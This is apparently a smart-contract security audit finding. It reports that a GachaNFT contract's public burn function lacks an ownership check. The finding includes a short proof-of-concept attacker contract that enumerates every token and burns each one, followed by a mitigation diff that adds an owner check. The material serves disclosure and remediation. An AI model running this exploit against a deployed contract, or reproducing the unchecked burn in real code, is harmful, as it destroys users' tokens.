
### Malicious user can burn anyone's token without their approval which completely breaks the functionality of the protocol

**Description:** The `GachaNFT::burn` function is neither protected by owner privileage modifier like `onlyOwner` nor it checks whether the `tokenId` belongs to the caller of the function. This will ultimately leads to any malicious user calling this function until they burn all the token of the contract, which significantly breaks the functionality and leads huge loss to the user. Moreover, it discourages the future-users to interact with this protocol making this dead contract.
The malicious actor gets the required information about all the tokens using the `GachaNFT::getAllNFTs` function.

```javascript
     function getAllNFTs() public view returns (NFTInfo[] memory) {
@>        return minted; 
    }

```

```javascript
@>    function burn(uint256 tokenId) public { 
        _burn(tokenId);
    }
```

**Impact:** 

Malicious user can burn every token of the contract making this contract tokenless.

**Proof of Concept:** 

A malicious user can exploit this vulnerabilty using the below contract:

```javascript

import "./GachaNFT.sol";

contract MaliciousActor {

    GachaNFT public gachaNFT;

    constructor(address _gachaNFTAddress) {
        gachaNFT = GachaNFT(_gachaNFTAddress);
    }

    function exploitBurn() public {
        GachaNFT.NFTInfo[] memory allNFTs = gachaNFT.getAllNFTs();

        for (uint256 i = 0; i < allNFTs.length; i++) {
            gachaNFT.burn(allNFTs[i].tokenId);
        }
    }
}

```

**Recommended Mitigation:** 

Place the following code in `GachaNFT.sol` contract.

```diff
    function burn(uint256 tokenId) public {
+    address owner = ownerOf(tokenId);
+    require(msg.sender == owner, "Caller is not the owner of this Token");
    
    _burn(tokenId);
    }
```
